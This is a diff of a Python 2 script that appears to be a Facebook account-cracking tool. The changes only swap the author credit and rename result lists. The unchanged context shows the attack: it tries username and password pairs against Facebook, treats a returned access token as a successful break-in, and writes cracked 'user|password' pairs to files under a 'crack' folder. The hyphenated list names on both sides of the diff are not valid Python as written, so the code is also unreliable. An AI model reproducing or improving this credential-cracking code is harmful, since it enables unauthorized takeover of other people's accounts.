@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by Yayan XD
+# code by none
 # my facebook ( https://www.facebook.com/KM39453 )
 import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
 from multiprocessing.pool import ThreadPool
@@ -459,13 +459,13 @@ def sc(user):
                         if 'access_token' in w:
                             print (H+"\r   * --> %s|%s|%s      %s"%(user,pw,a["name"],I))
                             wrt="%s|%s"%(user,pw)
-                            MAFIA-KILLER-Successful.append(wrt)
+                            ARBAB-Successful.append(wrt)
                             open("crack/Successful.txt", "a").write("%s\n"%(wrt))
                             break
                         elif 'www.facebook.com' in w['error_msg']:
                                 print (K+"\r   * --> %s|%s|%s      %s"%(user,pw,a["name"],I))
                                 wrt="%s|%s"%(user,pw)
-                                MAFIA-KILLER-Checkpoint.append(wrt)
+                                ARBAB-Checkpoint.append(wrt)
                                 open("crack/Checkpoint.txt","a").write("%s\n"%(wrt))
                                 break
                 loop+=1
@@ -508,11 +508,11 @@ def cs(user):
                             print (H+"\r   * --> %s|%s %s              "%(user,i,I))
                             wrt="%s|%s"%(user,i)
                             open("crack/Successful.txt","a").write("%s\n"%(wrt))
-                            MAFIA-KILLER-Successful.append(wrt)
+                            ARBAB-Successful.append(wrt)
                         elif 'www.facebook.com' in w['error_msg']:
                                 print (K+"\r   * --> %s|%s|%s %s              "%(user,i,b,I))
                                 wrt="%s|%s"%(user,i)
-                                MAFIA-KILLER-Checkpoint.append(wrt)
+                                ARBAB-Checkpoint.append(wrt)
                                 open("crack/Checkpoint.txt","a").write("%s\n"%(wrt))
                 loop +=1
                 sys.stdout.write(
